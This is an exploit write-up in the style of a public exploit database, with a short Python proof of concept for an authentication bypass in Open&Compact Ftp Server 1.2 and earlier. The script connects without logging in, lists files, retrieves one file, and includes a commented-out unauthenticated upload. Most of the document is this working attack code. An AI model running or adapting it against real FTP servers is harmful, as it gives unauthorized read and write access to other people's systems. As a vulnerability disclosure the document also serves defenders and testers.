# Exploit Title: Open&Compact Ftp Server <= 1.2 Full System Access
# Date: June 12, 2010
# Author: Serge Gorbunov
# Software Link: http://sourceforge.net/projects/open-ftpd/
# Version: <= 1.2
# Tested on: Windows 7, Windows XP SP3
#!/usr/bin/python

# Simply by omitting login process to the open ftp server it is possible
# to execute any command, including but not limited to: listing files,
# retrieving files, storing files. 
# Below is an example of a few commands. 
# If you want to test storing files with no authentication, create a 
# test file and uncomment out line with ftp.storbinary function call.

# Any command will work as long as there is at least on user who has the permission
# to execute that command. For example, storing files will work as long
# as there is one user with write permission. No matter whom it is. 

import ftplib
import os

# Connect to server
ftp = ftplib.FTP( "127.0.0.1" )
ftp.set_pasv( False ) 

# Note that we need no authentication at all!! 

print ftp.retrlines( 'LIST' )
print ftp.retrbinary('RETR changelog.txt', open('changelog.txt', 'wb').write ) 

# filename = 'test.txt'
# f = open( filename, 'rb' ) 
# print ftp.storbinary( 'STOR ' + filename, f )
# f.close()

ftp.quit()